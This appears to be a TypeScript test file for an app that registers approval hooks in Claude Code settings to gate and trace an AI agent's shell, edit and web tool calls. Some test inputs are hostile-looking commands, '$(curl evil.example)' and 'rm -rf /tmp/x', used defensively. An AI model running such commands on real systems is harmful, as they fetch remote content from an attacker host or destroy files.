import { describe, expect, it } from 'vitest'
import { HOOK_EVENTS, HOOK_MATCHER, hookKey, hookOutput, hookSettingsSnippet, hookToolName } from '../shared/hook'
import {
  addBridgeHook,
  bridgeHookCommands,
  isBridgeHook,
  removeBridgeHook
} from '../shared/hook-settings'

describe('hook tool naming', () => {
  it('names a shell command by its program, so a rule can target it', () => {
    // `Bash` alone is useless in a rule or a trace: every shell command would
    // share one name.
    expect(hookToolName('Bash', { command: 'rm -rf /tmp/x' })).toBe('bash:rm')
    expect(hookToolName('Bash', { command: '/usr/bin/git push --force' })).toBe('bash:git')
    expect(hookToolName('Bash', { command: '  npm   install ' })).toBe('bash:npm')
  })

  it('stays generic rather than inventing a name it cannot trust', () => {
    expect(hookToolName('Bash', {})).toBe('bash')
    expect(hookToolName('Bash', null)).toBe('bash')
    expect(hookToolName('Bash', { command: '' })).toBe('bash')
    expect(hookToolName('Bash', { command: '$(curl evil.example)' })).toBe('bash')
    expect(hookToolName('Bash', { command: 'a'.repeat(80) })).toBe('bash')
  })

  it('passes other tool names through, bounded in length', () => {
    expect(hookToolName('Edit', { file_path: '/tmp/a' })).toBe('Edit')
    expect(hookToolName('WebFetch', {})).toBe('WebFetch')
    expect(hookToolName('', {})).toBe('unknown')
    expect(hookToolName('X'.repeat(200), {}).length).toBe(80)
  })
})

describe('hook response', () => {
  it('emits the PreToolUse shape Claude Code reads back', () => {
    expect(hookOutput('deny', 'because')).toEqual({
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: 'because'
      }
    })
  })

  it('offers a settings stanza naming the real command, for both events', () => {
    const parsed = JSON.parse(hookSettingsSnippet('/path/to/hook.js')) as {
      hooks: Record<string, Array<{ matcher: string; hooks: Array<{ command: string; timeout: number }> }>>
    }
    expect(Object.keys(parsed.hooks).sort()).toEqual([...HOOK_EVENTS].sort())
    for (const event of HOOK_EVENTS) {
      const entry = parsed.hooks[event]![0]!
      expect(entry.matcher).toBe(HOOK_MATCHER)
      expect(entry.hooks[0]?.command).toBe('/path/to/hook.js')
      // Claude Code kills a hook at its timeout; the approval ceiling sits below it.
      expect(entry.hooks[0]?.timeout).toBeGreaterThan(120)
    }
  })

  it('covers the tools that can actually change or exfiltrate something', () => {
    for (const tool of ['Bash', 'Edit', 'Write', 'WebFetch']) {
      expect(HOOK_MATCHER.split('|')).toContain(tool)
    }
  })
})

describe('editing Claude Code settings', () => {
  const CMD = '/Applications/Bridge.app/out/main/hook.js'
  const add = (data: Record<string, unknown>, command = CMD): Record<string, unknown> =>
    addBridgeHook(data, command, HOOK_MATCHER, 130, HOOK_EVENTS)
  const remove = (data: Record<string, unknown>): Record<string, unknown> =>
    removeBridgeHook(data, HOOK_EVENTS)
  /** Bridge's commands across both events, flattened. */
  const commands = (data: Record<string, unknown>): string[] =>
    HOOK_EVENTS.flatMap((event) => bridgeHookCommands(data, HOOK_EVENTS)[event] ?? [])

  it('registers both events, so an outcome is always learned', () => {
    // PreToolUse alone decides calls but never learns what they did.
    const next = add({})
    for (const event of HOOK_EVENTS) {
      expect(bridgeHookCommands(next, HOOK_EVENTS)[event]).toEqual([CMD])
    }
    expect(commands(add({ hooks: {} }))).toEqual([CMD, CMD])
  })

  it('preserves unrelated settings and other tools’ hooks', () => {
    const before = {
      model: 'opus',
      permissions: { allow: ['Bash(ls)'] },
      hooks: {
        PostToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: '/other/tool' }] }],
        PreToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: '/somebody/else.sh' }] }]
      }
    }
    const next = add(before) as unknown as {
      model: string
      permissions: unknown
      hooks: Record<string, Array<{ hooks?: Array<{ command?: string }> }>>
    }
    expect(next.model).toBe('opus')
    expect(next.permissions).toEqual({ allow: ['Bash(ls)'] })
    // Both of their entries survive alongside ours, on both events.
    for (const event of HOOK_EVENTS) {
      const found = next.hooks[event]!.flatMap((m) => (m.hooks ?? []).map((h) => h.command))
      expect(found).toContain(CMD)
    }
    expect(next.hooks.PreToolUse!.flatMap((m) => (m.hooks ?? []).map((h) => h.command))).toContain('/somebody/else.sh')
    expect(next.hooks.PostToolUse!.flatMap((m) => (m.hooks ?? []).map((h) => h.command))).toContain('/other/tool')
  })

  it('replaces a stale Bridge entry rather than accumulating them', () => {
    const stale = add({}, '/old/path/out/main/hook.js')
    expect(commands(add(stale))).toEqual([CMD, CMD])
  })

  it('is idempotent', () => {
    expect(commands(add(add(add({}))))).toEqual([CMD, CMD])
  })

  it('removes both entries and cleans up the container it emptied', () => {
    const next = remove(add({}))
    expect(commands(next)).toEqual([])
    // Nothing else was in there, so no empty scaffolding is left behind.
    expect(next.hooks).toBeUndefined()
  })

  it('leaves another tool’s hook in place on removal', () => {
    const theirs = { matcher: 'Write', hooks: [{ type: 'command', command: '/somebody/else.sh' }] }
    const next = remove(add({ hooks: { PreToolUse: [theirs] } })) as unknown as {
      hooks: { PreToolUse: typeof theirs[] }
    }
    expect(next.hooks.PreToolUse).toEqual([theirs])
  })

  it('shares a matcher stanza without deleting the co-tenant', () => {
    // A stanza holding both their hook and ours must lose only ours.
    const shared = {
      hooks: {
        PreToolUse: [
          {
            matcher: 'Bash',
            hooks: [
              { type: 'command', command: '/somebody/else.sh' },
              { type: 'command', command: CMD }
            ]
          }
        ]
      }
    }
    const next = remove(shared) as unknown as { hooks: { PreToolUse: Array<{ hooks: Array<{ command: string }> }> } }
    expect(next.hooks.PreToolUse[0]?.hooks.map((h) => h.command)).toEqual(['/somebody/else.sh'])
  })

  it('recognises a Bridge entry written with either path separator', () => {
    expect(isBridgeHook({ command: 'C:\\Bridge\\out\\main\\hook.js' })).toBe(true)
    expect(isBridgeHook({ command: '/opt/bridge/out/main/hook.js' })).toBe(true)
    expect(isBridgeHook({ command: '/opt/other/out/main/proxy.js' })).toBe(false)
    expect(isBridgeHook({})).toBe(false)
    expect(isBridgeHook(null)).toBe(false)
  })

  it('survives a malformed hooks block instead of throwing', () => {
    for (const junk of [{ hooks: 'nope' }, { hooks: [] }, { hooks: { PreToolUse: 'nope' } }]) {
      expect(commands(junk as Record<string, unknown>)).toEqual([])
      expect(commands(add(junk as Record<string, unknown>))).toEqual([CMD, CMD])
    }
  })
})

describe('correlating the two halves of a hook call', () => {
  it('derives the same key from the same call, whichever process asks', () => {
    const input = { command: 'wp db query "SELECT 1"' }
    expect(hookKey('hook_s1', 'bash:wp', input)).toBe(hookKey('hook_s1', 'bash:wp', { ...input }))
  })

  it('ignores key order but not values', () => {
    expect(hookKey('s', 't', { a: 1, b: 2 })).toBe(hookKey('s', 't', { b: 2, a: 1 }))
    expect(hookKey('s', 't', { a: 1 })).not.toBe(hookKey('s', 't', { a: 2 }))
  })

  it('separates sessions, tools and arguments', () => {
    const base = hookKey('s1', 'bash:wp', { command: 'wp plugin list' })
    expect(hookKey('s2', 'bash:wp', { command: 'wp plugin list' })).not.toBe(base)
    expect(hookKey('s1', 'bash:mysql', { command: 'wp plugin list' })).not.toBe(base)
    expect(hookKey('s1', 'bash:wp', { command: 'wp plugin deactivate x' })).not.toBe(base)
  })
})
